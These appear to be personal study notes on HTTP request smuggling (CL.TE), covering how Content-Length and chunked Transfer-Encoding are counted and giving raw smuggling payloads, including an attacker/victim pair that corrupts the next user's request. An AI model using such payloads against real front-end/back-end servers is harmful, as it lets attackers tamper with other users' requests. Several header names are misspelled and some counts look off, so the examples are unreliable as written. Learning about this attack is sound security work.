# HRS0


Step 1. [CL.TE yt](https://www.youtube.com/watch?v=FbxpvWOegyo&t=20s)

Step 2. to find if they have load balancer or no use the IP Reverse lookup method!

Step 3. to understand Amazon follow step 2 and implement ALB at low cost


---

## Basics 🛠️
HRS works on any thing but idealy we need POST request!

Only POST requires CL or TE

According to the HTTP spec when a request has both CL and TE, TE is given higher priority.

CL counting: the Content length count begins after the empty line between the headers and the body of the request
and `\r\n` is counted as 2 bytes.

TE counting: when there is TE: 0  then the server would read 0\r\n\r\n that's it.

POST request parsing
```yaml
POST / HTTP/1.1
Host: localhost
Header1: value1
Header2: value2
Content-Lenght: 10

user=admin
```
Step 1. reads the first line `POST / HTTP/1.1`

Step 2. reads everything untill the empty line. which are headers and parse them

Step3. it will notice the CL header. and realise it has a body with 10 byteslong

Step4. it reads the 10 bytes and then the entire request parsing is completed.

so when parsing a request like:
```yaml
POST / HTTP/1.1
Host: localhost
Header1: value1
Content-Lenght: 10

user=adminGET / HTTP/1.1
Host: localhost

```

the server finds 2 different request's

---

### Working of CL 📩
```yaml
POST / HTTP/1.1
Host: localhost
Connection: close
Content-Lenght: 10

user=admin
```
the count of content-Lenght begins only after that empty line after the headers!
### Working of TE 📩

```yaml
POST / HTTP/1.1
Host: localhost
Connection: close
Transfer-Encoding: chunked

a
user=admin

0

```
there is `a` becasue TE uses hex and not dec!

---

# CL.TE concept: ⛓️‍💥

so the first server must see the full thing as a single request!

the second server must see the payload as two diffrent request!

how are we going to do that?

so for our gunicorn and nginx [space] thing we can do something like:

```yaml
POST / HTTP/1.1
Host: localhost
Content-lenght: 40
Transfer-Encoding : chunked

0

GET / HTTP/1.1
Host: localhost


```

so this is the conceptual paylaod!

to make this practical

Step 1. Find the correct Content-length

Step 2. Verify the Transfer-Encoding `0` in the request is correct!

---

## Attack for web-app 1:

Attacker request:
```yaml
POST / HTTP/1.1
Host: localhost
Content-lenght: 6
Tranfer-Encoding : chunked

0

G
```

victim request:
```yaml
POST / HTTP/1.1
Host: localhost
Content-lenght: 0

```

## Backend parsing:
the backend will parse the request's as:
```yaml
POST / HTTP/1.1
Host: localhost
Content-lenght: 6
Tranfer-Encoding : chunked

0
```
and 
```yaml
GPOST / HTTP/1.1
Host: localhost
Content-length: 0
```
and return method not found to the victim!



